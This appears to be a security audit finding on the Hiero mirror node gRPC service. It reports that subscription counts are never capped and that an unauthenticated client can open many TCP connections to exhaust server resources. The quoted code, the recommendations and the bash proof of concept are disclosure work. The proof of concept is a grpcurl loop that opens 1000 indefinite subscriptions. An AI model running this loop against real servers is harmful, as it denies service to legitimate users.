### Title
Unbounded gRPC Subscription DoS via Unlimited TCP Connections Bypassing Per-Connection Stream Limit

### Summary
`TopicMessageServiceImpl.subscribeTopic()` increments `subscriberCount` as a pure metrics gauge with no enforcement ceiling. The only server-side guard is `maxConcurrentCallsPerConnection = 5`, which limits HTTP/2 streams per TCP connection but places no cap on the number of TCP connections an unauthenticated attacker may open. An attacker who opens N connections and issues 5 no-`endTime`, no-`limit` subscriptions on each accumulates N×5 indefinitely-live subscriptions, exhausting JVM heap, Reactor scheduler threads, and database polling resources.

### Finding Description

**Code path and root cause**

`subscriberCount` is declared as a plain `AtomicLong` and registered only as a Micrometer gauge:

```java
// TopicMessageServiceImpl.java line 48
private final AtomicLong subscriberCount = new AtomicLong(0L);

// lines 52-55 – metric registration only, no enforcement
Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
     .description("The number of active subscribers")
     ...
     .register(meterRegistry);
``` [1](#0-0) 

`subscribeTopic()` increments the counter unconditionally on every new subscription and never checks it against a maximum before proceeding:

```java
// lines 88-91 – no guard before incrementAndGet()
return topicExists(filter)
    .thenMany(flux.doOnNext(topicContext::onNext)
        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
        .doFinally(s -> subscriberCount.decrementAndGet())
``` [2](#0-1) 

When `endTime` is absent, `isComplete()` always returns `false` and `pastEndTime()` returns `Flux.never()`, so the subscription lives indefinitely:

```java
// lines 123-126
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // subscription never self-terminates
    }
``` [3](#0-2) 

**Why the existing check is insufficient**

The only server-side guard is `maxConcurrentCallsPerConnection`, set to 5 by default:

```java
// NettyProperties.java line 14
private int maxConcurrentCallsPerConnection = 5;

// GrpcConfiguration.java line 33 – only this one limit is applied
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
``` [4](#0-3) [5](#0-4) 

No `maxConnectionAge`, no total-connection cap, and no per-IP connection limit are configured. The attacker simply opens more TCP connections. There is no authentication on the gRPC service.

**Exploit flow**

1. Attacker opens N TCP connections to port 5600 (no authentication required).
2. On each connection, sends 5 concurrent `subscribeTopic` RPCs with no `consensusEndTime` and `limit = 0`.
3. Each call passes `topicExists()`, increments `subscriberCount`, allocates a `TopicContext`, a multi-stage Reactor `Flux` chain, and schedules a `boundedElastic` safety-check task.
4. Each live subscription also registers a listener with `topicListener.listen()`, consuming listener fan-out slots and triggering periodic DB polling.
5. N×5 subscriptions accumulate indefinitely; `subscriberCount` grows without bound.

### Impact Explanation
Each indefinitely-live subscription holds: a `TopicContext` object, a multi-operator Reactor `Flux` pipeline, a `Schedulers.boundedElastic()` task, and a slot in the shared topic listener. At scale this exhausts JVM heap (OOM), saturates the bounded-elastic thread pool (blocking all reactive pipelines), and drives DB connection utilization to 100% (the Grafana alert threshold is 75%). The result is a complete denial of service for all legitimate subscribers on the affected pod.

### Likelihood Explanation
The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no privileged network position. The `grpcurl` invocation shown in the project's own documentation (`grpcurl -plaintext -d '{"topicID":...}' localhost:5600 ...`) is sufficient to reproduce it. A single attacker machine with modest resources can open thousands of TCP connections and issue 5 streams each. The attack is repeatable and persistent as long as the attacker keeps connections open.

### Recommendation
1. **Enforce a global subscription cap**: Before `subscriberCount.incrementAndGet()`, check the current value against a configurable maximum (e.g., `hiero.mirror.grpc.maxSubscribers`) and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Limit total TCP connections**: Add `serverBuilder.maxConnectionAge(...)` and a total-connection limit (e.g., via a Netty `ChannelHandler` or a load-balancer policy) to `GrpcConfiguration`.
3. **Add per-IP connection rate limiting**: Deploy an L4/L7 rate limiter (e.g., the GCP `BackendPolicy.maxRatePerEndpoint` already present in `values.yaml`) that also caps concurrent connections per source IP, not just request rate.
4. **Require authentication**: Enforce mTLS or an API-key interceptor so anonymous clients cannot open subscriptions.

### Proof of Concept
```bash
# Open 200 TCP connections, each with 5 concurrent indefinite subscriptions (1000 total)
for i in $(seq 1 200); do
  for j in $(seq 1 5); do
    grpcurl -plaintext \
      -d '{"topicID": {"topicNum": 41110}}' \
      <mirror-node-host>:5600 \
      com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done

# Observe subscriberCount metric growing without bound:
curl -s http://<mirror-node-host>:8081/actuator/prometheus \
  | grep hiero_mirror_grpc_subscribers
# Expected: hiero_mirror_grpc_subscribers{type="TopicMessage",...} 1000.0
# Server memory/thread exhaustion follows as connections scale up.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L87-92)
```java
        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-126)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L31-34)
```java
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```
